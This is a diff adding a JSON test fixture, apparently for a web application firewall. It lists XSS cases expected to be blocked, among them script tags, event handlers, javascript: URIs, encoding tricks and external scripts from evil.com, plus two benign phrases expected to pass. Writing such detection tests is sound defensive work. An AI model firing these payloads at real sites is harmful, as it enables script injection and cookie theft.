@@ -1,0 +1,27 @@
+{
+  "category": "xss",
+  "cases": [
+    {"name": "script 标签", "location": "url", "expect": "block", "path": "/xss?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
+    {"name": "img onerror 事件", "location": "url", "expect": "block", "path": "/xss?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"},
+    {"name": "javascript 伪协议", "location": "url", "expect": "block", "path": "/xss?q=%3Cimg%20src%3Djavascript%3Aalert(1)%3E"},
+    {"name": "svg onload", "location": "url", "expect": "block", "path": "/xss?q=%3Csvg%20onload%3Dalert(1)%3E"},
+    {"name": "iframe 注入", "location": "url", "expect": "block", "path": "/xss?q=%3Ciframe%20src%3D%2F%2Fevil.com%3E"},
+    {"name": "data:text/html", "location": "url", "expect": "block", "path": "/xss?q=data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="},
+    {"name": "document.cookie 窃取", "location": "url", "expect": "block", "path": "/xss?q=document.cookie"},
+    {"name": "外链脚本 src", "location": "url", "expect": "block", "path": "/xss?q=%3Cscript%20src%3D%2F%2Fevil.com%2Fx.js%3E%3C%2Fscript%3E"},
+    {"name": "大小写混淆 ScRiPt", "location": "url", "expect": "block", "path": "/xss?q=%3CScRiPt%3Ealert(1)%3C%2FScRiPt%3E"},
+    {"name": "双重 URL 编码", "location": "url", "expect": "block", "path": "/xss?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"},
+    {"name": "HTML 实体编码", "location": "url", "expect": "block", "path": "/xss?q=%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B"},
+    {"name": "body JSON 中的 XSS", "location": "body", "expect": "block", "method": "POST", "path": "/calc", "body": "{\"comment\":\"<script>alert(1)</script>\"}", "content_type": "application/json"},
+    {"name": "Referer 头注入", "location": "header", "expect": "block", "path": "/xss?q=x", "headers": {"Referer": "javascript:alert(1)"}},
+    {"name": "cookie 中的 XSS", "location": "cookie", "expect": "block", "path": "/xss?q=x", "cookie": "x=<script>alert(1)</script>"},
+    {"name": "body onload", "location": "url", "expect": "block", "path": "/xss?q=%3Cbody%20onload%3Dalert(1)%3E"},
+    {"name": "a 标签 javascript 链接", "location": "url", "expect": "block", "path": "/xss?q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Ex%3C%2Fa%3E"},
+    {"name": "裸 alert 调用", "location": "url", "expect": "block", "path": "/xss?q=alert(1)"},
+    {"name": "setTimeout 字符串执行", "location": "url", "expect": "block", "path": "/xss?q=setTimeout(%22alert(1)%22,100)"},
+    {"name": "meta refresh 伪协议", "location": "url", "expect": "block", "path": "/xss?q=%3Cmeta%20http-equiv%3Drefresh%20content%3D%220%3Burl%3Djavascript%3Aalert(1)%22%3E"},
+    {"name": "fromCharCode 编码构造", "location": "url", "expect": "block", "path": "/xss?q=String.fromCharCode(97,108,101,114,116)"},
+    {"name": "正常词 alert box", "location": "url", "expect": "allow", "path": "/xss?q=alert%20box"},
+    {"name": "正常词 javascript is fun", "location": "url", "expect": "allow", "path": "/xss?q=javascript%20is%20fun"}
+  ]
+}
